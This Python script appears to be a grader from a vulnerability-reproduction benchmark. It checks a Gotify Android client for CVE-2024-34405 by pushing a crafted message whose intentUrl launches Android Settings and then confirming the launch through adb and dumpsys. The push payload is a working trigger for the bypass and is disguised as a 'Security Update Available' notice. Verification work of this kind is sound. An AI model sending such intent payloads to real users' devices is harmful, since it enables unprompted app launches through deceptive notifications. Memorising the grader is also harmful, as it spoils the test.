#!/usr/bin/env python3
"""
Gotify Intent URL Confirmation Bypass — Verification Helper

Checks whether the vulnerability allows arbitrary intents to be launched
bypassing the confirmation dialog (CVE-2024-34405).

Two checks are performed:

1. SETTINGS LAUNCH CHECK — The exploit sends a push message with an
   intentUrl targeting the Android Settings app. On the VULNERABLE build,
   Intent.parseUri() + startActivity() directly launches Settings. On the
   CLEAN build, IntentUrlDialogActivity shows a confirmation dialog instead.
   Verification uses `adb shell dumpsys activity activities` to check the
   resumed activity. This is unfakeable — dumpsys queries the OS activity
   manager directly, not app-writable logs.

   If Settings is not already the resumed activity (e.g. due to background
   activity restrictions), verification also tries opening the notification
   shade and tapping the notification (whose content intent targets Settings
   on the vulnerable build).

2. MESSAGE CHECK — Queries the Gotify server for messages containing the
   exploit's intentUrl marker. This confirms the malicious push message
   was actually sent.

Both must be true: the exploit message was sent AND Settings was launched.

Exit codes:
    0 — NOT VULNERABLE: Settings was not launched
    1 — VULNERABLE: Settings app was launched via the intent
"""
import json
import os
import subprocess
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
GOTIFY_SERVER = "http://127.0.0.1:8080"
GOTIFY_USER = None  # Set from metadata.json
GOTIFY_PASS = None  # Set from metadata.json
PACKAGE = "com.github.gotify"

# The intent URL that targets Android Settings via Intent.parseUri().
SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"

# Marker to find the exploit message on the server
EXPLOIT_CALLBACK_MARKER = "com.android.settings"

# What we look for in dumpsys activity output
SETTINGS_MARKER = "com.android.settings"


# ---------------------------------------------------------------------------
# ADB helpers
# ---------------------------------------------------------------------------
def _adb(*args, timeout=15):
    """Run an adb command and return the CompletedProcess."""
    return subprocess.run(
        ["adb", *args],
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _get_resumed_activity():
    """Query dumpsys for the currently resumed activity.

    Checks for multiple possible field names across Android versions:
    - "ResumedActivity" (common on newer Android versions)
    - "topResumedActivity" (also seen on newer versions)
    - "mResumedActivity" (older Android versions)

    Returns the matching line content, or None if not found.
    """
    result = _adb("shell", "dumpsys", "activity", "activities")
    for line in result.stdout.split("\n"):
        stripped = line.strip()
        if stripped.startswith("ResumedActivity:") or stripped.startswith(
            "topResumedActivity="
        ):
            return stripped
        if "mResumedActivity" in stripped:
            return stripped
    return None


def _get_screen_size():
    """Get the emulator screen dimensions via adb shell wm size."""
    result = _adb("shell", "wm", "size")
    for line in result.stdout.strip().split("\n"):
        if "size:" in line.lower():
            parts = line.split(":")[-1].strip()
            w, h = parts.split("x")
            return int(w), int(h)
    return 1080, 1920  # Fallback default


# ---------------------------------------------------------------------------
# Check 1: Verify Settings was launched
# ---------------------------------------------------------------------------
def _get_or_create_app_token():
    """Return an application token we can use to push messages."""
    resp = requests.get(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        timeout=10,
    )
    if resp.ok:
        apps = resp.json()
        if apps:
            return apps[0]["token"]

    resp = requests.post(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        json={
            "name": "VerifyApp",
            "description": "Temporary app for verification",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["token"]


def _send_settings_intent_message(app_token):
    """Push a message whose intentUrl targets the Settings app."""
    payload = {
        "title": "Security Update Available",
        "message": "Tap to install the latest patch.",
        "priority": 5,
        "extras": {
            "android::action": {
                "onReceive": {
                    "intentUrl": SETTINGS_INTENT_URL,
                }
            }
        },
    }
    resp = requests.post(
        f"{GOTIFY_SERVER}/message",
        headers={"X-Gotify-Key": app_token},
        json=payload,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def _try_notification_tap():
    """Open the notification shade via swipe and tap the notification.

    Uses `adb shell input swipe` from the top edge to pull down the
    notification shade, then taps at multiple Y positions.

    Returns True if Settings became the resumed activity after tapping.
    """
    w, h = _get_screen_size()
    print(f"[check_url] Screen size: {w}x{h}")

    tap_x = w // 2

    # Pull down notification shade with a swipe from the very top
    print("[check_url] Swiping down to open notification shade...")
    _adb("shell", "input", "swipe", str(tap_x), "0", str(tap_x), str(h // 2), "300")
    time.sleep(2)

    # Tap at multiple Y positions to hit a notification
    tap_positions = [
        int(h * 0.25),
        int(h * 0.30),
        int(h * 0.35),
        int(h * 0.40),
        int(h * 0.20),
    ]

    for i, tap_y in enumerate(tap_positions):
        print(f"[check_url] Tapping at ({tap_x}, {tap_y})...")
        _adb("shell", "input", "tap", str(tap_x), str(tap_y))
        time.sleep(2)

        resumed = _get_resumed_activity()
        if resumed and SETTINGS_MARKER in resumed:
            print(f"[check_url] Settings launched after tap {i + 1}!")
            return True

        if resumed and PACKAGE in resumed:
            print(f"[check_url] Gotify activity opened after tap {i + 1}: {resumed}")
            return False

    return False


def trigger_and_check_settings_launch():
    """Check if Settings was launched, with fallback to notification tap.

    On the VULNERABLE build, the WebSocketService calls startActivity()
    with the parsed intent, which directly launches Settings (bypassing
    the confirmation dialog). SYSTEM_ALERT_WINDOW is pre-granted, allowing
    the service to start cross-app activities.

    Steps:
    1. Send a push message with intentUrl targeting Settings
    2. Wait for the app to process the message
    3. Check dumpsys for Settings as the resumed activity (direct launch)
    4. If not found, try tapping the notification (fallback)

    Returns True if Settings is the currently resumed activity.
    """
    print("[check_url] --- Settings Launch Check ---")

    try:
        token = _get_or_create_app_token()
        print(f"[check_url] Obtained app token: {token[:8]}...")

        print("[check_url] Sending push message with Settings intentUrl...")
        msg = _send_settings_intent_message(token)
        print(f"[check_url] Message sent (id={msg.get('id')})")

        print("[check_url] Waiting 5 seconds for app to process message...")
        time.sleep(5)

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False
    except Exception as e:
        print(f"[check_url] ERROR sending message: {e}", file=sys.stderr)
        return False

    # Check 1a: Was Settings launched directly by startActivity()?
    resumed = _get_resumed_activity()
    if resumed:
        print(f"[check_url] Current resumed activity: {resumed}")
        if SETTINGS_MARKER in resumed:
            print("[check_url] Settings was launched directly by startActivity()")
            return True
    else:
        print("[check_url] Could not determine resumed activity")

    # Check 1b: Press HOME to dismiss any dialogs, then try notification tap
    print("[check_url] Settings not resumed directly, trying notification tap...")
    _adb("shell", "input", "keyevent", "KEYCODE_HOME")
    time.sleep(1)

    if _try_notification_tap():
        return True

    # Final check
    resumed = _get_resumed_activity()
    if resumed:
        print(f"[check_url] Final resumed activity: {resumed}")
        if SETTINGS_MARKER in resumed:
            return True

    print("[check_url] Settings app is NOT the resumed activity")
    return False


# ---------------------------------------------------------------------------
# Check 2: Did the exploit send the malicious message?
# ---------------------------------------------------------------------------
def detect_exploit_message():
    """Check if the Gotify server has a message with the exploit's intentUrl.

    Queries the Gotify REST API for messages and looks for ones containing
    the exploit's callback URL marker.

    Returns True if an exploit message is found on the server.
    """
    print("[check_url] --- Message Check ---")

    try:
        resp = requests.get(
            f"{GOTIFY_SERVER}/message",
            auth=(GOTIFY_USER, GOTIFY_PASS),
            timeout=10,
        )
        if not resp.ok:
            print(
                f"[check_url] ERROR: Failed to query messages: {resp.status_code}",
                file=sys.stderr,
            )
            return False

        data = resp.json()
        messages = data.get("messages", [])
        print(f"[check_url] Found {len(messages)} message(s) on server")

        for msg in messages:
            extras = msg.get("extras", {})
            android_action = extras.get("android::action", {})
            on_receive = android_action.get("onReceive", {})
            intent_url = on_receive.get("intentUrl", "")

            if EXPLOIT_CALLBACK_MARKER in intent_url:
                print(
                    f"[check_url] Found exploit message "
                    f"(id={msg.get('id')}): intentUrl={intent_url}"
                )
                return True

        print(
            f"[check_url] No messages with '{EXPLOIT_CALLBACK_MARKER}' "
            "in intentUrl found"
        )
        return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global GOTIFY_USER, GOTIFY_PASS

    script_dir = os.path.dirname(os.path.abspath(__file__))
    metadata_path = os.path.join(script_dir, "../../../metadata.json")

    try:
        with open(metadata_path, "r") as f:
            metadata = json.load(f)
        GOTIFY_USER = metadata["username"]
        GOTIFY_PASS = metadata["password"]
    except (FileNotFoundError, KeyError) as e:
        print(
            f"[check_url] Error reading metadata.json: {e}",
            file=sys.stderr,
        )
        sys.exit(1)

    # Check 1: Was Settings launched?
    settings_launched = trigger_and_check_settings_launch()

    # Check 2: Did the exploit send the malicious message?
    exploit_message_found = detect_exploit_message()

    # Report results
    print("[check_url] --- Results ---")
    print(f"[check_url] Settings app launched:         {settings_launched}")
    print(f"[check_url] Exploit message on server:     {exploit_message_found}")

    if settings_launched and exploit_message_found:
        print(
            "[check_url] VULNERABLE: exploit message was sent AND Settings "
            "app was launched (no confirmation dialog)"
        )
        sys.exit(1)
    elif exploit_message_found and not settings_launched:
        print(
            "[check_url] NOT VULNERABLE: exploit message exists but Settings "
            "did not launch (confirmation dialog blocked it)"
        )
        sys.exit(0)
    elif settings_launched and not exploit_message_found:
        print(
            "[check_url] NOT VULNERABLE: Settings launched but no exploit "
            "message found (possible manual launch)"
        )
        sys.exit(0)
    else:
        print(
            "[check_url] NOT VULNERABLE: no exploit message and no "
            "Settings launch detected"
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
